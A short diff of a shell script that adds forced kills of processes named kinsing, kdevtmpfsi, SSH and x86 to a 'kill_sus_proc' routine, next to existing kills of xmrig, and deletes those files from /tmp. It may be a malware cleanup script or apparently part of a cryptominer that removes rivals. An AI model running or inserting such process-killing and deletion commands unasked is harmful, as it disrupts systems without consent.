@@ -695,6 +695,14 @@ kill_sus_proc()
 killall -9 xmrig
 killall -9 jj
 killall -9 p
+killall -9 kdevtmpfsi
+killall -9 SSH
+killall -9 kinsing
+killall -9 x86
+rm -f /tmp/kdevtmpfsi
+rm -f /tmp/kinsing
+rm -f /tmp/SSH
+rm -f /tmp/x86
 kill_miner_proc
 kill_sus_proc
 
